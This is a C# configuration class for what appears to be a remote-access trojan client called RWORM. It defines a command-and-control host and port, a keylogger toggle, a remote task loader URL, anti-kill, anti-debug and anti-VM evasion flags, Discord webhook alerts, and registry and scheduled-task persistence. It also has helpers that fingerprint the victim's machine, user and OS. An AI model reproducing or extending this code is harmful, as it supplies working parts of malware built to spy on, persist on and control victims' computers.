using System;
using System.IO;

namespace RWORM.Client.Core
{
    public class Config
    {
        
        public static string C2Host = "127.0.0.1";
        public static int    C2Port = 3333;
        public static string EncryptionKey = "AES-256-DEFAULT";
        public static int    ReconnectDelay  = 5000;
        public static int    ConnectTimeout  = 8000;
        public static int    HeartbeatInterval = 30000;
        public static string PastebinRaw     = "";

        
        public static bool   KeyloggerEnabled = false;
        public static bool   KeyloggerOnline  = false;   

        
        public static bool   TaskEnabled   = false;
        public static string TaskLoaderUrl = "";          

        
        public static bool AntiKill  = true;
        public static bool AntiDebug = false;
        public static bool AntiVM    = false;

        
        public static bool   DiscordAlert   = false;
        public static string DiscordWebhook = "";

        
        public static bool   StartupRegistry = false;
        public static bool   SchTasks        = false;
        public static string StartupPath     = @"%APPDATA%\RWORM";

        

        public static string GetGuid()
        {
            var path = Path.Combine(Path.GetTempPath(), "rworm.id");
            if (File.Exists(path)) return File.ReadAllText(path).Trim();
            var guid = Guid.NewGuid().ToString();
            try { File.WriteAllText(path, guid); } catch { }
            return guid;
        }

        public static string GetHostname()   => Environment.MachineName;
        public static string GetUsername()   => Environment.UserName;
        public static string GetOSVersion()  => Environment.OSVersion.ToString();
    }
}
